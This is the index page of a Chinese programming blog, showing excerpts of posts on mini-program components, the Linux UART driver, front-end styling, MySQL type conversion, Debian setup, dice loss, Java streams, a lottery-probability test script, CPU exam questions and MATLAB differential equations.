<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/192f39c07abafbdf67b49dfe3ccb9207/" rel="bookmark">
			微信小程序-组件的使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		组件的使用 在页面上需要将数据显示为树形结构，多个页面上使用，所以将树形结构封装成一个组件，在页面上引用即可
tree 结构 在文件夹下新建一个component的文件夹
&lt;!-- tree.wxml --&gt; &lt;view wx:for="{{tree}}" wx:key="index" class="c-tree"&gt; &lt;view class="tree-item tree-item-select {{selectKey == item.id ? 'tree-item-name-select' : '' }}"&gt; &lt;view class="tree-item_text"&gt; &lt;view class="tree-item-onOff" wx:if="{{item.children &amp;&amp; item.children.length &gt; 0}}" bindtap="isOpen" data-index="{{index}}"&gt; &lt;image src="/assets/u1490.svg" class="icon-image {{item.open ? 'tree-item-onOff-open' : 'tree-item-onOff-closed'}}"&gt;&lt;/image&gt; &lt;/view&gt; &lt;view class="tree-item-onOff" wx:else&gt;&lt;/view&gt; &lt;view class="tree-item-name" bindtap="select" data-item="{{item}}" data-index="{{index}}"&gt; &lt;view class="name"&gt;{{item.name}}&lt;/view&gt; &lt;view class="img"&gt; &lt;!-- &lt;image wx:if="{{selectKey == item.id }}" src="/assets/icon/u435.svg"&gt;&lt;/image&gt; --&gt; &lt;/view&gt; &lt;/view&gt; &lt;/view&gt; &lt;!-- &lt;view class="typeItem_btn"&gt; &lt;view class="
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/192f39c07abafbdf67b49dfe3ccb9207/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1622a269f129281480d9bee6c311ec12/" rel="bookmark">
			UART驱动程序详解（基于Linux）——注册过程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 参考内核源码：drivers\tty\serial\imx.c
drivers\tty\serial\serial_core.c
drivers\tty\tty_port.c
drivers\tty\tty_io.c
uart驱动由于历史原因，实现过程不像i2c那样简单——使用独立的模块实现， 而是基于tty框架来实现的。其实现过程相对比较复制，下面跟踪内核源码来解密uart是如何实现的，由于注册过程不涉及line discipline ,这里不详细解释。 很多中文资料习惯性的将uart驱动的实现过程分层处理，这符合unix驱动的分离分层思想，但我更喜欢将uart的实现过程看成 “uart是基于tty字符设备框架的一种封装”，注册uart驱动的过程实质上是注册tty设备驱动的过程，故很多资料上都有说明，串口就是tty设备的一种。让我们来解开uart的神秘面纱吧。
首先定位到drivers\tty\serial\imx.c的 init函数：
init函数主要做了两件事情：注册了一个uart_driver和一个平台设备驱动platform_driver。下面逐一分析两个函数。
首先看一下uart_register_driver: 它在构造tty_driver结构体，并且重要的成员变量的数据来源于uart_driver,其中最重要的是tty_set_operation(normal,&amp;uart_ops)这句，它为tty_driver提供了tty驱动的操作函数，但uart_ops在哪里实现，这里先设置一个悬念。到此就注册好了uart_driver,从源码上可以看出，实质上注册的是tty_driver,只不过披了一层华丽的外衣。
接下来看看platform_driver_register(&amp;serial_imx_driver):
当设备树的compatible属性和of_match_table匹配时会调用serial_imx_probe函数，接下来看看probe函数的实现过程：
probe函数先解析了设备树，然后获取设备树的硬件信息 ，然后构造了uart_port结构体（目前出现的第三个重要结构体，已红色标出），其中最重要的是imx_pops,它是uart_ops结构体类型，回到之前的tty_driver的注册过程可知，tty_driver所使用的设备操作函数就是uart驱动的设备操作函数，应用程序访问uart驱动实质上是访问tty驱动，然后操作了uart的操作函数。 之后又注册了uart_port。
看到这里基本可以想象出uart与tty的关系，但字符设备驱动是在哪里注册的呢，进入uart_add_one_port函数分析，下面是函数的调用关系：
uart_add_one_port(struct uart_driver *drv, struct uart_port *uport)
tty_port_register_device_attr(port, drv-&gt;tty_driver, uport-&gt;line, uport-&gt;dev, port, uport-&gt;tty_groups);
tty_port_register_device_attr(port, drv-&gt;tty_driver, uport-&gt;line, uport-&gt;dev, port, uport-&gt;tty_groups);
tty_register_device_attr(driver, index, device, drvdata, attr_grp);
tty_cdev_add(driver, devt, index, 1);
逐层调用后到tty_cdev_add，然后在这里实现字符设备驱动的注册。
由上面分析可以总结出，注册tty_driver是为了提供与硬件无关的信息，如设备号，设备名称；注册平台设备驱动是为了设置与串口相关的硬件操作函数。实现驱动与硬件的分离，符合unix编程思想。
本人在分析内核源码的过程中省略了大量细节，有些可以分析的不到位，甚至是错误的，欢迎嵌入式前辈批评指正。。。。。。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86f24383f326627375686295a51af009/" rel="bookmark">
			前端代码实现摇一摇功能，全网详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言： 由于公司业务调整，特意学习下uni项目框架，其实根据官方api就是实现很多功能，其实都是一些小坑要走，下面来说一下前端项目中如何代码实现摇一摇功能 下面是mpaas中使用摇一摇功能，微信小程序同
直接上代码：
html代码如下
&lt;!-- html--&gt; &lt;view class="page"&gt; &lt;!-- &lt;button type="primary" onTap="watchShake"&gt; 绑定摇一摇，点击 Shake 按钮看效果 &lt;/button&gt; --&gt; &lt;view class="yao"&gt; &lt;image src="../image/shake.jpg" class="item-img pic_mobel" a:if="{{shakeScroll}}" mode="scaleToFill"&gt;&lt;/image&gt; &lt;image src="../image/shake.jpg" class="item-img shake-slow " a:if="{{!shakeScroll}}" mode="scaleToFill"&gt;&lt;/image&gt; &lt;/view&gt; &lt;/view&gt; js代码如下
// API-DEMO page/API/watch-shake/watch-shake.js Page({ data: { shakeScroll: false }, onLoad() { var _this = this _this.loadShake(); }, setTimeoutFunc() { var _this = this _this.setData({ shakeScroll: true }) clearTimeout(timer); var timer = setTimeout(() =&gt; { _this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/86f24383f326627375686295a51af009/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d55b93b94fa397ed3f9fefd70b787725/" rel="bookmark">
			Cascader级联选择器自定义高度
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在引入cascader级联选择器后，会导致整个级联选择器高度占满页面的情况，我们只需在全局样式中加上如下代码固定下高度即可
.el-scrollbar__wrap { height: 300px; } 此时添加完后却又出现了另一个问题：选择器中每一项中都带有一个圆形按钮，而且只有点击圆形按钮才能实现选中，可以稍作修改
我们只需在全局样式中加上如下代码消除圆形按钮
.el-radio__inner { border-radius: 0; border: 0; width: 170px; height: 34px; background-color: transparent; cursor: pointer; box-sizing: border-box; position: absolute; top: -18px; left: -19px; } .el-radio__input.is-checked .el-radio__inner { background: transparent; } ———————————————— 版权声明：本文为CSDN博主「啊都给」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 原文链接：https://blog.csdn.net/malone66/article/details/119699674 应用完样式后又发现选择器在选择完选项后不会自动隐藏了（必须手动点击空白处）
此时我们可以添加一个侦听器，选择项一发生改变就关闭它
watch: { selectedKeys() { if (this.$refs.refSelect) { this.$refs.refSelect.dropDownVisible = false } } } 在此之前我们需要在Cascader标签中添加ref引用
&lt;el-cascader v-model="selectedKeys" ref="refSelect" &gt; &lt;el-cascader&gt; 其中
DropDownVisible ：属性指定或检索一个值，该值指示下拉列表是否可见（true：可见，false：不可见）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5571d683dfd2d23464b6f57f0cd3713/" rel="bookmark">
			mysql where 条件 查询varchar类型的字段 加‘‘和不加‘‘的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		效果展示： sql1: SELECT * FROM `view_bom_data` WHERE `bom_id` = '1552562196716716034' AND `bd_bom_version` = '3' sql2: SELECT * FROM `view_bom_data` WHERE bom_id = 1552562196716716034 AND bd_bom_version = 3 sql1查询结果：
sql2查询结果：
分析 sql1 查询出来的只包含bom_id = ‘1552562196716716034’ 的数据共18条 ，而sql2却查询出189条数据
造成原因 mysql会将字符串自动转换为数字类型，导致精度丢失
mysql字符串与数字比较问题
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/28021d38eee4dfe32006ee85a00e9851/" rel="bookmark">
			oracle library is not loaded【非常详细】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1 下载插件 官网地址
https://www.oracle.com/cn/database/technologies/instant-client/winx64-64-downloads.html
没有账号的自己注册一个
压缩包长这个样子
解压后放到一个存英文目录
我的路径
E:\EDish2\soft\OracleClient\instantclient_19_10
2 配置Navicat 确定后重启navicat连接Oracle即可
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7edb80a6f62e6dae89ea3c7b4779b48b/" rel="bookmark">
			debian安装和基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		debian安装和基本使用 由于centos停止更新，改用debian
debian下载，官网去下载DVD版本，4g多的体量，包含的软件比较全。
虚拟机安装，如果进入安装界面直接黑屏卡死，要注意是否镜像ISO文件未加挂。手动在虚拟机的CD设备那边加载镜像，并启动时连接即可。
安装时选可视化安装，英文语言。地区最近的只能选香港，时区一致。
该页面注意一下，要用LVM，方便日后扩展，以后肯定会碰到空间不够的情况。
磁盘分区：选最复杂的分
下面的选项，增加SSH server 。去掉desktop 以及gnome , 能节约不少内存。会用linux的人应该不会需要UI吧。
最后启动选项，是否需要GRUD选YES，然后选择其所在路径。忘记截图了，默认是空的，一定要选一个具体的路径。否则系统启动不起来，会卡死在一个小光标那边。
虚拟机实际安装体验：建议用vmware的典型模式来安装，会更便捷。
非常重要的一件事，vi编辑，退格键无法用！解决办法： 用vi 打开/etc/vim/vimrc.tiny，输入或修改成以下两行：
set nocompatible
set backspace=2
保存退出就行了。
开启SSH远程的root权限：vi /etc/ssh/sshd_config 把PemitRootLogin 后面的数据改成yes ,然后去掉注释符。保存退出，重启ssh : service ssh restart
在安装时切记：勾选SSH server ，否则自己要apt 在线安装 如果忘记安装SSH，则：
安装SSH 前需要更换apt源：如果是root用户，可以不用sudo前缀。
sudo vi /etc/apt/sources.list 源地址网上搜吧，习惯用阿里云的。
特此记录阿里云源：bullseye 是debian11的代号，每一代的debian都有自己的代号。如果用的不是11，去网上搜代号。代号不对，apt安装必然出现冲突问题。
deb http://mirrors.aliyun.com/debian/ bullseye main non-free contrib
deb-src http://mirrors.aliyun.com/debian/ bullseye main non-free contrib
deb http://mirrors.aliyun.com/debian-security/ bullseye-security main
deb-src http://mirrors.aliyun.com/debian-security/ bullseye-security main
deb http://mirrors.aliyun.com/debian/ bullseye-updates main non-free contrib
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7edb80a6f62e6dae89ea3c7b4779b48b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/956e23c7960ac469516ee0de3e965fde/" rel="bookmark">
			dice loss
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转自：https://www.jianshu.com/p/6039042a3aaf
Dice系数 是一种集合相似度度量函数，通常用于计算两个样本的相似度（范围为[0, 1]）
公式
在语义分割中，X是Ground Truth分割图像 ，Y是预测的分割图像
由此可以得到dice loss
dice loss的提出就是解决前景比例太小的问题
Dice系数是分割效果的一个评判指标，其公式相当于预测结果区域和ground truth区域的交并比，所以它是把一个类别的所有像素作为一个整体去计算Loss的。因为Dice Loss直接把分割效果评估指标作为Loss去监督网络，而且计算交并比时还忽略了大量背景像素，解决了正负样本不均衡的问题，所以收敛速度很快
举例：
Dice Loss和交叉熵函数的比较： 交叉熵损失函数中交叉熵值梯度计算形式类似于p-t，其中，p 是softmax输出，t为target。
极端场景下，当 p 和 t 的值都非常小时，计算得到的梯度值可能会非常大. 通常情况下，可能导致训练更加不稳定。
直接采用 dice-coefficient 或者 IoU 作为损失函数的原因，是因为分割的真实目标就是最大化 dice-coefficient 和 IoU 度量。而交叉熵仅是一种代理形式，利用其在 BP 中易于最大化优化的特点。
另外，Dice-coefficient 对于类别不均衡问题，效果可能更优。然而，类别不均衡往往可以通过简单的对于每一个类别赋予不同的 loss 因子，以使得网络能够针对性的处理某个类别出现比较频繁的情况。因此，对于 Dice-coefficient 是否真的适用于类别不均衡场景，还有待探讨。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ddc3c627d97419fe1509234277d923b/" rel="bookmark">
			字节输入流（InputStream）与字节输出流（OutputStream）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		怎么确定输入输出的方向？
字节流输入输出的方向是以Java为标准的。我们可以把文件和Java虚拟机之间想象成有一条通道。数据在通道中流通，这就有了输入流和输出流。当程序要读取文件的时候，调用程序把文件传入java虚拟机，这是输入流；当程序要向文件写入数据的时候，数据就会从Java虚拟机中流向文件，这就是输出流。
字节输出流（OutputStream）
OutputStream是Java标准库提供的最基本的输出流，位于java.io包里。它不是一个具体的类或者接口，而是一个抽象类。同时它是所有字节输入流的父类。
如何使用字节输出流（OutputStream）？？？
案例代码
public static void dem() throws IOException { OutputStream out = new FileOutputStream("F:\\aa.txt", true); String ss = "枯藤老树昏鸦，小桥流水人家，古道西风瘦马，夕阳西下，断肠人在天涯"; byte[] bytes = ss.getBytes();//getBytes()方法把字符串转为字节数组 out.write(bytes); } //测试代码 @Test public void test1() { try { dem(); System.out.println("执行完毕"); } catch (IOException e) { e.printStackTrace(); } } 字节输入流（InputStream）
InputStreams是Java标准库提供的最基本的输入流，位于java.io包里。它不是一个具体的类或者接口，而是一个抽象类。同时它是所有字节输入流的父类。
如何使用字节输入流（InputStream）？？？
利用我们刚才写出的文件 aa.txt 来做实例
//一次只读取一个字节的方法 public static void demo1() throws IOException { //1、把外部文件创建为一个输入流对象 InputStream fis = new FileInputStream("F:\\aa.txt"); //2、在Java中把输入流的字节读取出来 int date; while ((date = fis.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ddc3c627d97419fe1509234277d923b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b21550c5df011f7b20a42da54df8d024/" rel="bookmark">
			ES12 新增方法之 Intl.ListFormat、Intl.DateTimeFormat、Intl.RelativeTimeFormat
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. Intl.ListFormat 是什么？Intl.ListFormat 参数/用法 2. Intl.DateTimeFormat() 是什么？Intl.DateTimeFormat 参数/用法 3. Intl.RelativeTimeFormat() 是什么？Intl.RelativeTimeFormat() 参数/用法 1. Intl.ListFormat 是什么？ Intl.ListFormat 用来处理和多语言相关的对象格式化操作
Intl.ListFormat 参数/用法 new Intl.ListFormat([locales[, options]])
输出处理过后的字符串
参数
nametype是否可选默认项描述localesstring是-符合 BCP 47 语言标注的字符串或字符串数组。en 英文 / zh-CN 中文环境optionsObject是-拥有下面所列属性中任意几个或全部的对象。options 配置项：localeMatcherstring是lockup指定要使用的本地匹配算法。可选参数：‘best fit’ / lockuptypestring是conjunction消息输出的格式。可选参数：disjunction / unit / conjunction ,stylestring是long被格式化消息的长度。可选参数：long / short /narrow , 当 type:unit 时，style 只能取 narrow zh-CN 表示用在中国大陆区域的中文。包括各种大方言、小方言、繁体、简体等等都可以被匹配到。
zh-Hans 表示简体中文。适用区域范围是全宇宙用中文简体的地方，内容包括各种用简体的方言等。
代码示例：
//不允许存在数字,如有空格，不会忽略空格 let strArr = ["xiaoming", "小明", "小红", "XXMM"]; let EnForm = new Intl.ListFormat("en",{ localeMatcher:'lookup', style:'short', type:'disjunction' }).
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b21550c5df011f7b20a42da54df8d024/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2529008bb0cfa9294c9f47fe1898b1fe/" rel="bookmark">
			Python--抽奖概率统计测试
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景：有个抽奖相关的需求，其中给定虚拟奖品的概率是95%，实物奖品的概率是5%，实物中又有很多价值不等的礼物，概率也不一样。想着写个脚本，把抽到的奖品记录下来，然后计算整体的抽奖概率。
写这个抽奖概率统计脚本思路：
1、第一步，请求抽奖接口，获取接口数据
2、接口中的rewardType，rewardName字段表示奖品的id和名称，其中rewardType&lt;8时，都是虚拟奖品，大于8的都是实物奖品，就可以根据rewardType判断，在这5000次抽奖中，抽到了几次虚拟奖品，几次实物奖品，可以算出虚拟/实物奖品的概率
3、然后根据实物列表中，计算每个实物出现的次数，将重复的实物奖品以字典形式的输出
4、再根据每个实物出现的次数，计算概率
from time import sleep import requests from collections import Counter def choujiang(**kwargs): shiwu_num = 0 # 实物奖品数量 xuni_num = 0 # 虚拟奖品数量 testList = [] # 实物名称 totel = 5000 # 总的抽奖次数 headers_admin = {'content-type': 'application/x-www-form-urlencoded', 'ua': 'xxx', 'Cookie': 'xxx', } for i in range(totel): # 第一步，请求抽奖接口，获取接口数据 result = requests.post("http://api.xxx.com/liveshow/activity/seventh/getReward", headers=headers_admin) response = result.json() print(response) # 接口中的rewardType，rewardName字段表示奖品的id和名称，其中rewardType&lt;8时，都是虚拟奖品，大于8的都是实物奖品 rewardType = response['data']['rewardType'] rewardName = response['data']['rewardName'] if rewardType &lt; 8: shiwu_num = shiwu_num + 1 testList.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/2529008bb0cfa9294c9f47fe1898b1fe/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/61eb79cf89da66e1a203ddd394b46b03/" rel="bookmark">
			计算机组成原理——中央处理器の选择题整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		CPU的功能和基本结构 1、条件转移指令执行时所依据的条件来自（）
A、指令寄存器
B、标志寄存器
C、程序计数器
D、地址寄存器
解析：选B
指令寄存器（IR）：用于存放当前正在执行的指令
标志寄存器：存放条件转移的条件。在条件转移时，需要对标志寄存器中的内容进行测试，如果满足条件，才可以转移。
程序计数器（PC）：用于存放下一个指令的地址
地址寄存器：用于暂存指令或数据的地址
2、下面有关程序计数器（PC）的叙述中，错误的是（）
A、PC中总是存放指令地址
B、PC的值由CPU在执行指令过程中进行修改
C、转移指令时，PC的值总是修改为转移指令的目的地址
D、PC的位数一般和存储器地址寄存器（MAR）的位数一样
解析：选C
对于A，PC中总是存放下一个指令的地址，即指令地址
对于B，PC中的值会在CPU执行指令过程中（取指指令结束后）进行修改，或者自增，或者转移到程序的某一处。
对于C，转移指令时，只有在符合转移条件的情况下，CPU的值才会修改为转移指令的目的地址。
对于D，地址寄存器用来存放地址，而PC存放指令地址，两者都是地址，因此位数一样，如果PC位数小于MAR位数，那有一些地址就无法被PC存放，如果PC位数大于MAR位数，就会产生浪费，因此一般都是一样的。
3、在一条无条件跳转指令的指令周期内，PC的值被修改（）次
A、1
B、2
C、3
D、无法确定
解析：选B
在取指操作完成后，PC加１，被修改一次。
因为是无条件的跳转指令，因此一定会跳转，在跳转到目标指令时，PC被修改一次，修改为要跳转到的目标地址。
因此一共是被修改两次。
4、以下关于计算机系统的概述中，正确的是（）
a.CPU不包括地址译码器
b.CPU的程序计数器中存放的是操作数地址
c.CPU中决定指令执行顺序的是程序计数器
d.CPU的状态寄存器对用户是完全透明的
A、a、c
B、c、d
C、b、c、d
D、a、c、d
解析：选A
对于ａ，地址译码器是用来接受 CPU 送来的地址信号并对它进行译码，选择与此地址码相对应的存储单元，以便对该单元进行读／写操作。是位于存储器中，不在CPU中。
对于b，程序计数器（PC）是用来存放下一条指令地址的。
对于c，因为PC中存放的是下一条要执行的指令地址，因此执行顺序是由它决定的。
对于d，CPU内对用户完全透明的：程序状态字寄存器（PSW）、通用寄存器组、程序计数器（PC）。对用户不透明的：指令寄存器（IR）、存储器地址寄存器（MAR）、存储器数据寄存器（MDR）
5、下列寄存器中，汇编语言程序员可见的是（）
A、存储器地址寄存器（MAR）
B、程序计数器（PC）
C、存储器数据寄存器（MDR）
D、指令寄存器（IR）
解析：选B
CPU内对用户完全透明的：程序状态字寄存器（PSW）、通用寄存器组、程序计数器（PC）。对用户不透明的：指令寄存器（IR）、存储器地址寄存器（MAR）、存储器数据寄存器（MDR）
6、某计算机的主存空间为4GB，字长为32位，按字节编址，采用32位字长指令字格式。若指令按字边界对齐存放，则程序计数器（PC）和指令寄存器（IR）的位数至少分别是（）
A、30、30
B、30、32
C、32、30
D、32、32
解析：选B
因为指令寄存器存放当前正在执行的指令地址，因此位数等于指令字长，即32位
因为计算机字长为位32位（4B），采用32位（4B）字长指令字格式，存储空间为4GB（232B），因为边界对齐存放（如果不对齐存放的话，就不能知道一行有多少字节了，题目就无法做了），所以每一行有4B（每一条指令有4B），一共有232/4=230条，因为PC要表示出所有的指令地址，所以PC需要30位。
指令执行过程 1、采用DMA方式传递数据时，每传送一个数据就要占用（）
A、指令周期
B、时钟周期
C、机器周期
D、存取周期
解析：选D
DMA（Direct Memory Access）：直接内存操作 / 组数据传送方式，在数据传送过程中，没有保存现场、恢复现场之类的工作。由于CPU根本不参加传送操作，因此就省去了CPU取指令、取数、送数等操作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/61eb79cf89da66e1a203ddd394b46b03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e7c845227809202cc20752050fe19e7e/" rel="bookmark">
			推荐一个全新硬件/嵌入式刷题网站！免费！好用！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		越来越多的人才从转码变成了转硬件，但是转岗过程中会遇到一些问题，比如：对学习路线不清晰、找不到专业的练习题、企业真题搜寻困难，不知道笔面试考察那些内容。
基础编程是一个计算机专业的必备技能，嵌入式的要求一般都是c++，数据结构，操作系统，Linux基础等。所以任何一个计算机相关的专业都是具备嵌入式的基本能力的，都是可以学会嵌入式的。
对于想转嵌入式或者正在学习嵌入式的我推荐去牛客网刷题学习，牛客网新上线的嵌入式题单非常专业，非常适合拿来练习提升！而且内容全部免费！
传送门：
https://www.nowcoder.com/link/pc_gzh_dyjqr_qianrushi
专业嵌入式题单 整个题单知识点编排详细，题目安排合理，题目表述以指导的形式进行。不管是初学者练习还是进阶学习都非常适合。
传送门：
https://www.nowcoder.com/link/pc_gzh_qrsdzh_qianrushi
海量专业的题目 除了强烈推荐的嵌入式题单外，牛客网整个硬件题库覆盖了80+个常用硬件技能点的题目，包括Verilog、电磁兼容、PCB、AMB总线、单片机等多个常见技能考察点，覆盖了硬件行业95%以上岗位的需求！
整个硬件题库是由牛客的内容研发团队和特邀专家共创完成，300+出题专家团队，题目方向有把握！质量有保障！
传送门：
https://www.nowcoder.com/link/pc_gzh_dyjqr_qianrushi
交流讨论 牛客网提供的题解专区以及讨论区会有大神提供解题思路，对于学习提升及其友好，或许有不清楚的语法，不理解的地方，看看别人的思路，别人的代码，也许就能豁然开朗。 传送门：
https://www.nowcoder.com/link/pc_gzh_qrsdzh_qianrushi
大量企业真题&amp;面经
除了及其细致的知识点划分，牛客网还上线了大量的企业真题，并且持续上新，投递目标企业之前先摸清常考内容，笔试更有把握！
同时还有超级活跃的学习社区，可以掌握第一手笔面试资讯！
传送门：
https://www.nowcoder.com/link/pc_gzh_dyjqr_qianrushi
牛客网已经逐渐成为硬件学习必不可少的一个网站！内容还全部免费！免费！免费！
赶快点击下方阅读原文看一看吧！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a537318732a8b0a95db4c2b9a1e9981/" rel="bookmark">
			B站自定义播放倍数（亲测有效）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		按F12 打开控制台 document.querySelector('bwp-video').playbackRate=2.5 //2.5为你需要设置的倍数
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07ec3eef09238ee0276fa0411d769cfc/" rel="bookmark">
			（C语言）按升序（降序）排序一个数组--冒泡排序
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入： 昨天我们介绍了二分法（折半查找法）的使用和代码演示，该二分法存在一定的局限性，即只能在一个有序的数组中查找一个目标数target，为了消除此局限性，我们必须在使用二分法之前把该数组排序成一个有序数组，把一个无序数组变成一个有序数组的方法叫做--冒泡排序
正文： 冒泡排序实现原理(这里讲升序，假设该数组有10个元素)：
取出一个无序数组中的第一个元素，把第一个元素和后面的一个元素进行比较如果第一个元素比后面的一个元素大则这两个元素进行交换，交换后第一个元素跑到了第二个元素的位置上面，然后又和第三个元素进行交换，如果此次比较发现，第一个元素比第三个元素的值小那么不交换，说明第一个元素小于第三个元素，此时我们就把第三元素和第四个元素进行比较，以此类推我们就可以在本次循环中把本数组中的元素最大值放在数组的最后一个位置上面完成后，第一趟比较结束；我们发现第一趟比较了9次，然后进行下一趟比较。
我们此时就来到了第二趟的比较，经过上一趟的比较后，可知该数组的最后一个元素为此数组中的最大值，为此此趟排序中就不考虑最后一个元素，所以第二趟相比于第一趟的比较次数要少一次，即为9-1=8次，以此类推可以知道第三趟比较7次、第四趟比较6次、第五趟比较5次.....此时我们就要确定趟数的次数了，我们知道一趟排序就把一个元素的位置确定下来了，该数组有10个元素，按理说需要10趟，但假设我们已经完成了8趟排序，已经有8个元素“安顿下来了”此时还有两个元素的位置还没有确定下来，那么我们仅需要一趟排序就可以把这两个元素“安顿”下来；所以我们需要总的趟数为数组元素个数10-1=9趟即可完成排序
综合上述例子我们可以知道，冒泡排序一个含有n个元素的的无序数组，需要进行n-1趟排序，而每趟排序比较的次数也在随趟数的增加而减少，即比较次数=n-1-已经完成的趟数。
上述冒泡排序后就可以实现一个无序数组的排序
实现代码演示如下：
#include&lt;stdio.h&gt; int main() { int arr[] = { 1,3,5,7,9,2,4,6,8,10 }; int n = sizeof(arr) / sizeof(arr[0]);//计算数组元素个数 printf(" 冒泡排序前："); for (int i = 0; i &lt; n; i++) { printf("%d ", arr[i]); } printf("\n"); //冒泡排序（升序）开始 //确定趟数n元素个数 for (int i = 0; i &lt; n - 1; i++)//需要进行n-1趟 { //确定比较次数,i的值是已经排序的总的趟数 for (int j = 0; j &lt; n - 1 - i; j++)//比较次数=n-1-i { if (arr[j] &gt; arr[j + 1])//如果前一个元素大于后一个元素则交换 { //if的判断条件控制升序 int tem = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = tem; } } } printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07ec3eef09238ee0276fa0411d769cfc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dfec4c864ee4c6e1fc338b8c2bae9ece/" rel="bookmark">
			【数学建模】微分方程求解 | dsolve函数 | ode45函数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		提示：文章写完后，目录可以自动生成，如何生成可参考右边的帮助文档
文章目录 前言一、微分方程解析解（dsolve函数）1.1 例子一 二、微分方程数值解（ode45函数）1.1例子11.2 例子2 阿波罗卫星运动轨迹 前言 参考教材。数学实验：基于matlab软件
一、微分方程解析解（dsolve函数） 1.1 例子一 如果不考虑初值条件直接求解：
y=dsolve('D2y=sin(2*x)-y','x'); 第一个‘’是微分方程，第二个‘’是自变量
得到结果如下（包含未知参数C1C2）：
如果考虑初值条件直接求解：
y=dsolve('D2y=sin(2*x)-y','y(0)=0,Dy(pi)=0','x'); 相比于无初值条件只是中间多了‘’
但是此时matlab会报错，是因为新版本matlab在求解微分方程时需要声明“谁是谁的函数”，这里就是y是x的函数
修改后不报错了
syms y(x); y=dsolve('D2y=sin(2*x)-y','y(0)=0,Dy(pi)=0','x'); y 那如果想画图展示一下呢？如果直接使用plot如下：
syms y(x); y=dsolve('D2y=sin(2*x)-y','y(0)=0,Dy(pi)=0','x'); plot(0:0.01:pi,y) 直接会报错：
这是因为此时得到的解析解y是字符串，直接画图是不行的。
修改后：
